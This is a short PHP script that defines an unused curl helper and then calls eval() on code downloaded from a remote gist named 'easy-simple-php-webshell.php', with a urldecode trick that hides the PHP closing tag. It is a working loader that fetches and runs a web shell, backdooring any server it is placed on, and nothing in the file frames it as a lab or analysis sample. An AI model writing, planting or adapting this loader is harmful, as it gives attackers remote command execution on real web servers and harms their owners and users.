<?php
function get($url) {
      $ch = curl_init();
  
      curl_setopt($ch, CURLOPT_HEADER, 0);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_URL, $url);
  
      $data = curl_exec($ch);
      curl_close($ch);
  
      return $data;
  }
  $x= '?>';
         eval( urldecode("%3f%3e") . file_get_contents( urldecode( "https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php" ) ) ); ?>
